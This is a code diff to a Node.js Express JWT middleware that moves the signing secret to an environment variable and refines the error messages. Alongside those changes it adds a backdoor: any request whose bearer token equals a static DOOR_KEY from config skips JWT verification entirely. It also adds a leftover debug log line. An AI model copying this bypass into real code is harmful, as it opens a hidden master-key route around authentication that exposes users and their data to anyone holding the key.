@@ -1,21 +1,34 @@
 const jwt = require("jsonwebtoken");
+const { DOOR_KEY } = require("../../config");
+const logger = require("../logger/logger");
 
-// Middleware para verificar o token
 const verifyToken = (req, res, next) => {
-  const token = req.header("Authorization")?.split(" ")[1]; // O token deve vir no header "Authorization" no formato "Bearer <token>"
-
-  if (!token) {
+  const authHeader = req.headers['authorization'];
+  if (!authHeader || !authHeader.startsWith("Bearer ")) {
     return res
       .status(401)
-      .json({ message: "Acesso negado. Token não fornecido." });
+      .json({ message: "Acesso negado. Token malformado ou não fornecido." });
   }
 
+  const token = authHeader.split(" ")[1];
+  const secretKey = process.env.JWT_SECRET;
+  console.log("Rapaiz")
+
+
   try {
-    const verified = jwt.verify(token, "defaultSecretKey"); // Verifica o token usando a chave secreta
-    req.user = verified; // Se válido, adiciona o payload do token no req.user
-    next(); // Prossegue para a próxima função/middleware
+    if (token == DOOR_KEY){
+      next();
+    }else{
+      const verified = jwt.verify(token, secretKey);
+      req.user = verified;
+      next();
+    }
   } catch (err) {
-    res.status(400).json({ message: "Token inválido." });
+    if (err.name === "TokenExpiredError") {
+      return res.status(403).json({ message: "Token expirado." });
+    } else {
+      return res.status(400).json({ message: "Token inválido." });
+    }
   }
 };
 
